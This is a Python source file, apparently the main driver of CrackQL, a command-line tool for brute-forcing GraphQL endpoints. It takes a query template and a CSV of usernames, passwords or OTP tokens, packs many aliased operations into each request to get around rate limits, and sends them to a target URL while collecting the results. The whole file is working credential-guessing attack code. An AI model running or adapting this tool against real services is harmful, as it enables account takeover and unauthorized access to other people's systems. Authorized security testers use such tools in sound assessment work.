from optparse import OptionParser
from version import VERSION
from lib.validations import verify_url, verify_query, verify_inputs
from lib.parser import indent, get_root_type, get_csv_row_count, get_operation
from lib.generator import inject_payload, generate_payload, send_payload
from lib.helpers import print_output
import sys
import csv
import math
import requests
import json
import time


def main():
	# Get arguments

	parser = OptionParser(
		usage='%prog -t http://example.com/graphql -q sample-queries/login.graphql -i sample-inputs/users-and-passwords.csv -b 10 -a alias'
	)
	parser.add_option(
		'-t',
		'--target',
		dest='url',
		help='Target url with a path to the GraphQL endpoint'
	)
	parser.add_option(
		'-q',
		'--query',
		dest='query',
		help='Input query or mutation operation with variable payload markers'
	)
	parser.add_option(
		'-i',
		'--input-csv',
		dest='input_csv',
		help='Path to a csv list of arguments (i.e. usernames, emails, ids, passwords, otp_tokens, etc.)'
	)
	parser.add_option(
		'-d',
		'--delimiter',
		dest='delimiter',
		help='CSV input delimiter (default: ",")',
		default=','
	)
	parser.add_option(
		'-o',
		'--output-json',
		dest='output_json',
		help='Output results to a JSON file (default: results/[url]-[timestamp].json)',
	)
	parser.add_option(
		'-b',
		'--batch-size',
		dest='batch_size',
		help='Number of batch operations per GraphQL document request (default: 100)',
		default=100
	)
	parser.add_option(
		'-a',
		'--alias-name',
		dest='alias_name',
		help='Prefix name of the alias used to batch query operations appended with auto incremented IDs (default: alias)',
		default='alias'
	)
	parser.add_option(
		'-D',
		'--delay',
		dest='delay',
		help='Time delay in seconds between batch requests (default: 0)',
		default=0
	)
	parser.add_option(
		'--verbose',
		action='store_true',
		dest='verbose',
		help='Prints out verbose messaging',
		default=False
	)

	parser.add_option(
		'-v',
		'--version',
		action='store_true',
		dest='version',
		help='Print out the current version and exit.',
		default=False
	)

	options, args = parser.parse_args()

	print('[*] Starting CrackQL...')

	# Verify required arguments exist

	if options.version:
		print('version:', VERSION)
		sys.exit(0)

	if not options.url:
		parser.error('Target URL (-t) not given')
		parser.print_help()
		sys.exit(1)

	if not options.query:
		parser.error('GraphQL query operation (-q) not given ')
		parser.print_help()
		sys.exit(1)

	if not options.input_csv:
		parser.error('Input file (-i) not given')
		parser.print_help()
		sys.exit(1)


	print_output('[*] Validating URL, query operation and inputs...', options.verbose)

	# Verify Target GraphQL Endpoint

	if not verify_url(options.url):
		sys.exit(1)

	# Verify GraphQL Operation (mock data)

	# if not verify_query(options.query):
	# 	sys.exit(1)

	# Verify Input CSV exists and is correct csv format

	if not verify_inputs(options.query, options.input_csv, options.delimiter):
		sys.exit(1)

	# **TODO** Measure CSV Input Size and Potentially Shared for better processing 

	print_output('[*] Generating & parsing batch queries...', options.verbose)

	with open(options.query, 'r') as file:
		query_data = file.read()

		# Store root operation type
		root_type = get_root_type(query_data)

		# Store operation
		operation = get_operation(query_data)

		batch_operations = ''
		alias_id = 1
		batches_sent = 0
		csv_rows = get_csv_row_count(options.input_csv, options.delimiter)
		total_requests_to_send = math.ceil(csv_rows / int(options.batch_size))
		data_results = {}
		error_results = []

		with open(options.input_csv, newline='') as csvfile:
			reader = csv.DictReader(csvfile, delimiter=options.delimiter, skipinitialspace=True)
			for variables in reader:

				batch_operations = batch_operations + '\n' + options.alias_name + str(alias_id) + ':' + inject_payload(operation, variables)
		
				if (alias_id + 1 ) > (int(options.batch_size) * (batches_sent + 1)):
					batches_sent += 1
					time.sleep(int(options.delay))
					payload = generate_payload(batch_operations, root_type)
					response = send_payload(options.url, payload, batches_sent, total_requests_to_send, options.verbose)

					try:
						data_results = dict(list(data_results.items()) + list(response['data'].items()))
						error_results = error_results + response['errors']
					except:
						pass

					# Clear batch data
					batch_operations = ''

				alias_id += 1

			if batches_sent != total_requests_to_send:
				batches_sent += 1
				time.sleep(int(options.delay))
				payload = generate_payload(batch_operations, root_type)
				response = send_payload(options.url, payload, batches_sent, total_requests_to_send, options.verbose)
				try:
					data_results = dict(list(data_results.items()) + list(response['data'].items()))
					error_results = error_results + response['errors']
				except:
					pass

			print('Data:')
			print(data_results)
			print('Error:')
			print(error_results)









if __name__ == '__main__':
    main()
































